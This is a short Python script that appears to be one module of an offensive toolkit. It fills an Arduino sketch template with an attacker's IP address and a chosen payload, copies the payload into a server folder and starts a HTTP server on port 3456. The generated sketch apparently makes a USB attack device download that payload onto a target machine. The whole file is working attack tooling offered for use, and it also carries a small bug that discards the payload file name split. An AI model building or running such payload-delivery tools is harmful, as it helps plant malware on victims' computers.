import time, os, shutil
reset = '\033[32;0;0m'
header = '\033[95m'
blue = '\033[94m'
pos = '\033[92m'
info = '\033[93m'
neg = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

def execute():
    f = open('modules/http_vec.ino', 'r')
    code = f.read()
    f.close()
    host = raw_input(info + ' [*] Enter your IP addr: ')
    payload = raw_input(info + ' [*] Enter your payload: ' + reset)
    if '/' in payload:
        mal = payload.split('/')[-1]
    mal = payload
    code = code.replace("{host}", host)
    code = code.replace("{mal}", mal)
    ino_name = 'http_vec' + time.ctime().replace(' ', '-') + '.ino'
    shutil.copy(payload, 'server/')
    os.chdir('server/')
    f = open(ino_name, 'w')
    f.write(code)
    f.close()
    print(blue + ' [+] Your file has been saved to %s' % UNDERLINE + BOLD + os.getcwd() + '/' + ino_name + reset)
    print(info + ' [*] press Ctrl + C to quit' + reset)
    os.system('python -m SimpleHTTPServer 3456')



